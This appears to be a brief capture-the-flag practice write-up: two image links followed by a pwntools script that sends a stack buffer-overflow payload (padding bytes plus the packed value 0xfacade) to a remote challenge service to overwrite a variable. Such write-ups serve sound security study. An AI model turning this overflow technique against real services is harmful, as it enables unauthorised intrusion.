![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/c78583db-9a51-44cd-a497-e8788d4cafe2)

![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/991459d1-d2ab-49ae-9226-6d91297b45fb)

After Analysis 
We can write this script
import pwn

io = pwn.remote("pwn", port number )

io.sendline()

payload = b"A" * 50  # Fill `buf`
payload += b"A" * 14  # reach next integer variable on a 64-bit system
payload += b"A" * 24 # fill sample
payload += pwn.p32(0xfacade)  

io.sendline(payload)
io.interactive()
